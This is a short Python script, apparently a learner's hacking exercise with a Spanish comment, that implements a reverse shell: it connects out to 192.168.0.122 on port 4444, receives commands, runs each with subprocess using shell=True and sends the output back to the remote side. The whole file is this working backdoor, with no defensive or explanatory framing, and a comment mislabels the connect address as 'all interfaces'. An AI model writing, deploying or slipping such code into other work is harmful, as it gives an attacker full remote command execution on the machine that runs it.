import socket
import subprocess

# connection.send() envia datos a NOSOTROS, basicamente un print()
address = ("192.168.0.122", 4444)  # all interfaces, port 4444


def execute_sys_comand(command):
    return subprocess.check_output(command.decode(), shell=True)


connection = socket.socket(
    family=socket.AF_INET,
    type=socket.SOCK_STREAM,
)

connection.connect(address)


while True:
    command = connection.recv(1024)
    command_output = execute_sys_comand(command)
    connection.send(command_output)

connection.close()
